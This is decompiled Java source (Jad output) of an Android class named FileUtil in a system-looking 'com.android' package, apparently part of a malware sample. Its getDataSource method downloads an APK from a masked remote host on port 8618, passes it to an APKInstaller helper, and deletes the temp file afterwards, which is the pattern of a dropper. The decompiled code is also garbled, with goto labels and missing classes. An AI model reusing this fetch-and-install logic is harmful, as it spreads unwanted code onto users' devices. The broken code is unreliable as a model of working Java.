// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   FileUtil.java

package com.android;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;
import android.webkit.URLUtil;
import java.io.*;
import java.net.URL;
import java.net.URLConnection;

// Referenced classes of package com.android:
//            APKInstaller

public class FileUtil extends Activity
{

    public FileUtil()
    {
        currentFilePath = "";
        currentTempFilePath = "";
        fileEx = "";
        fileNa = "";
        myTempFile = null;
    }

    private void delFile(String s)
    {
        File file = new File(s);
        if(!file.exists())
        {
            return;
        } else
        {
            boolean flag = file.delete();
            return;
        }
    }

    public static void main(String args[])
    {
        int i = (new FileUtil()).getFile("http://xxxxxxxxx9:8618/client/android/a.apk");
    }

    public void getDataSource(String s)
    {
        if(!URLUtil.isNetworkUrl(s))
        {
            int i = Log.e("info", "ERROR URL");
            return;
        }
        InputStream inputstream;
        FileOutputStream fileoutputstream;
        byte abyte0[];
        URLConnection urlconnection = (new URL(s)).openConnection();
        urlconnection.connect();
        inputstream = urlconnection.getInputStream();
        int j;
        if(inputstream == null)
            j = Log.e("info", "stream is null");
        String s1 = fileNa;
        StringBuilder stringbuilder = new StringBuilder(".");
        String s2 = fileEx;
        String s3 = stringbuilder.append(s2).toString();
        File file = File.createTempFile(s1, s3);
        myTempFile = file;
        String s4 = myTempFile.getAbsolutePath();
        currentTempFilePath = s4;
        File file1 = myTempFile;
        fileoutputstream = new FileOutputStream(file1);
        abyte0 = new byte[128];
_L1:
        int k;
        Exception exception;
        StringBuilder stringbuilder1;
        String s6;
        String s7;
        int l;
        k = inputstream.read(abyte0);
        if(k <= 0)
        {
            String s5 = APKInstaller.install(currentTempFilePath);
            inputstream.close();
            return;
        }
        int i1 = 0;
        try
        {
            fileoutputstream.write(abyte0, i1, k);
        }
        // Misplaced declaration of an exception variable
        catch(Exception exception)
        {
            stringbuilder1 = new StringBuilder("error: ");
            s6 = exception.toString();
            s7 = stringbuilder1.append(s6).toString();
            l = Log.e("info", s7);
            return;
        }
          goto _L1
    }

    public int getFile(String s)
    {
        int i = s.lastIndexOf(".") + 1;
        int j = s.length();
        String s1 = s.substring(i, j).toLowerCase();
        fileEx = s1;
        int k = s.lastIndexOf("/") + 1;
        int l = s.lastIndexOf(".");
        String s2 = s.substring(k, l);
        fileNa = s2;
        String s3 = currentFilePath;
        if(s.equals(s3))
            getDataSource(s);
        currentFilePath = s;
        _cls1 _lcls1 = new  Object(s)     /* anonymous class not found */
    class _anm1 {}

;
        (new Thread(_lcls1)).start();
        int i1 = 0;
_L2:
        return i1;
        Exception exception;
        exception;
        i1 = 1;
        if(true) goto _L2; else goto _L1
_L1:
    }

    public String getMIMEType(File file)
    {
        String s = file.getName();
        int i = s.lastIndexOf(".") + 1;
        int j = s.length();
        String s1 = s.substring(i, j).toLowerCase();
        String s2;
        if(s1.equals("m4a") || s1.equals("mp3") || s1.equals("mid") || s1.equals("xmf") || s1.equals("ogg") || s1.equals("wav"))
            s2 = "audio";
        else
        if(s1.equals("3gp") || s1.equals("mp4"))
            s2 = "video";
        else
        if(s1.equals("jpg") || s1.equals("gif") || s1.equals("png") || s1.equals("jpeg") || s1.equals("bmp"))
            s2 = "image";
        else
        if(s1.equals("apk"))
            s2 = "application/vnd.android.package-archive";
        else
            s2 = "*";
        if(!s1.equals("apk"))
        {
            String s3 = String.valueOf(s2);
            s2 = (new StringBuilder(s3)).append("/*").toString();
        }
        return s2;
    }

    protected void onPause()
    {
        super.onPause();
    }

    protected void onResume()
    {
        String s = currentTempFilePath;
        delFile(s);
        super.onResume();
    }

    public void openFile(File file)
    {
        Intent intent = new Intent();
        Intent intent1 = intent.addFlags(0x10000000);
        Intent intent2 = intent.setAction("android.intent.action.VIEW");
        String s = getMIMEType(file);
        Uri uri = Uri.fromFile(file);
        Intent intent3 = intent.setDataAndType(uri, s);
        startActivity(intent);
    }

    private static final String TAG = "DOWNLOADAPK";
    private String currentFilePath;
    private String currentTempFilePath;
    private String fileEx;
    private String fileNa;
    private File myTempFile;
}
